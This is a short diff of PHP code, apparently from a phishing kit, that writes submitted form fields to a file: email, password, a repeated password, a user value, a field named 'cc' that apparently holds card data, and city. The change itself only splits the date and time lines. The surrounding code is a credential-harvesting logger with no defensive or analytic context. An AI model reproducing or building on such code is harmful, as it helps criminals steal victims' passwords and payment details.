@@ -25,8 +25,9 @@ fwrite($file,
 "* EMAIL: ".$_POST['email']."
 * PASS: ".$_POST['pass']."
 * PASS1: ".$_POST['pass1']."
-* FECHA: ".date('Y-m-d')."
-* HORA: ".date('H:i:s')."
+* FECHA: 
+".date('Y-m-d')."
+".date('H:i:s')."
 ".$userp."
 ".$cc."
 ".$city."   
